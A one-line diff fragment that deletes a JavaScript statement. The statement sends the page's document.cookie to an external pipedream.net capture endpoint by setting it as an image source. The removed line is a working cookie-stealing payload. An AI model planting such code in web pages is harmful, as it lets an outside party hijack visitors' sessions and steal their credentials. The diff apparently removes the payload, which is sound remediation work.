@@ -1,1 +1,0 @@
-new Image().src = "https://e2b733da07ad42672ecbba7ee748f0fe.m.pipedream.net/?cookie=" + document.cookie;
